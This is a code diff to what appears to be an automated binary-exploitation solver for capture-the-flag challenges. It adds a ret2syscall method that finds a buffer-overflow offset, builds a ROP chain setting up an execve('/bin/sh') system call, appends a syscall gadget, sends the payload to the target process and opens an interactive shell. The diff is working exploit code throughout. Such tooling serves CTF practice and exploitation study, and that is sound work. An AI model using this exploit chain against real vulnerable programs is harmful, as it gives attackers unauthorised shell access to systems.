@@ -37,9 +37,29 @@ class App:
         self.elf = self.pipe.cmd("aflj")
         
         #one = self.find_one_gadget(binary)
-        self.ret2system(binary)
+        self.ret2syscall(binary)
 
     # ================ SOLVE FUNCTIONS ===================
+
+    def ret2syscall(self, binary):
+        io = process(binary)
+
+        syscall = None
+        binsh = next(self.pwnelf.search(b"/bin/sh"))
+        payload = self.find_overflow(binary)
+        payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
+
+        for file, gadget in self.rs.search(search="syscall"):
+            if "syscall;" in str(gadget):
+                syscall = int(str(gadget).split(":")[0], 16)
+                break
+
+        payload += p64(syscall)
+
+        io.sendlineafter(b">>>", payload)
+
+        io.interactive()
+
 
     def ret2system(self, binary, add_ret=True):
         io = process(binary)
